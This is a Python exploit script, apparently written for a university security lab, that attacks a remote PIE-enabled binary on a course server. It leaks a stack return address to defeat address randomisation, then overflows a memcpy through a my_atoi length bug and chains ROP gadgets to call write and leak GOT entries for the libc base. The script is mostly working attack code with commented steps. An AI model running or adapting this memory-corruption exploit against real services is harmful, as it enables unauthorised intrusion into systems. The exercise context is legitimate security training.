import sys
import struct
# from pwn import *
import socket
import signal
import time

host = "lettieri.iet.unipi.it"
port = 7002

def sendn(conn, buf, n):
    sent = 0
    while sent < n:
        sent += conn.send(buf[sent:])

    #print("Sent {} bytes".format(sent))

def recvn(conn, n):
    buf = b''
    buf = conn.recv(n)

    while len(buf) < n:
        
        b = conn.recv(n - len(buf)) 
        if b == b'':
            print("loop..")
            break
        buf += conn.recv(n - len(buf)) 
    
    
    print("Received {} bytes".format(len(buf)))
    return buf

def pack(a):
    return struct.pack("Q", a)

def unpack(a):
    return struct.unpack("Q", a)[0]

def signal_handler(sig, frame):
    print("Exiting ...")
    exit()

#signal.signal(signal.SIGINT, signal_handler)


# this time PIE is enabled. We have to locate the base address of the executable
# In fact, if you look for symbols for instance with nm, you only find offsets, not
# addresses. Even the plt has not addresses, but offsets. So the first thing to do
# is to locate where the binary is loaded in memory.

# This can be achieved using the functions echo and do_stuff. First you have to call
# do_stuff. This function uses SMALL_BUFF and do stuff. The important thing is that
# calling that function will leave its return address on the stack. Then, you can call
# echo, making sure that its read will read LESS THAN MEDIUM_BUF. After, the write will
# of course print till the end of the buffer, revealing the previous return address
# of the do_stuff function. So in this way you can compute where the binary is located.

# then, you can call again do_stuff and try to exploit my_atoi and of course the memset
# to gain control and proceed like in the previous exercise. 


LARGE_BUF =	512
MEDIUM_BUF = 128
SMALL_BUF = 32

with socket.create_connection((host, port)) as conn:

    buf = b"1" + b"\n" # force calling do_stuff
    sendn(conn, buf, len(buf))
    time.sleep(1)

    buf = b"0" + b"\n"
    sendn(conn, buf, len(buf))
    time.sleep(1)

    buf = b"A"*31 + b"\n"
    sendn(conn, buf, len(buf))

    buf = recvn(conn, 128)
    buf = buf[32:]
    n = 8
    buf = [buf[i:i+n] for i in range(0, len(buf), n)]
    
    stack_content = [struct.unpack("Q", buf[i])[0] for i in range(0, len(buf))]

    # the return address of memcpy saved on the stack is shown! 
    # it corresponds to the nop that is present after the memcpy
    base_address = stack_content[3] - 0xc74 # nop offset is 0xc74

    print("Binary base address: {}".format(hex(base_address)))


# now that the base address is computed, we can:
#   1. choose the gadgets
#   2. exploit the memcpy by:
#       2a. controlling the number of the bytes to be copied, exploiting my_atoi
#       2b. creating the ROP chain to leak got a learn libc base address

with socket.create_connection((host, port)) as conn:

    offset_to_rip = 0x38  
    buf = b'512' # to be read by my_atoi
    buf += b"A"*(offset_to_rip - len(buf)) # fill

    # gadgets: I can call write and leak the got again!
    got_offset = 0x201468
    got_address = base_address + got_offset 
    write_plt_offset = 0x980
    write_plt_address = base_address + write_plt_offset
    
    gadget1 = 0x0000000000000fab + base_address #: pop rdi; ret; 
    gadget2 = 0x0000000000000fa9 + base_address #: pop rsi; pop r15; ret;

    buf += pack(gadget1)
    buf += pack(0x1) # fd 1
    buf += pack(gadget2)
    buf += pack(got_address)
    buf += b"B"*8
    buf += pack(write_plt_address)
    # in rdx there is already 512

    sendn(conn, buf, len(buf))
    buf = recvn(conn, 512)
    
    n = 8
    buf = [buf[i:i+n] for i in range(0, len(buf), n)]
    for i in range(0, len(buf)):
        print(hex(unpack(buf[i])))

    """
    setsockopt_address = unpack(buf)
    print(hex(setsockopt_address))
    """

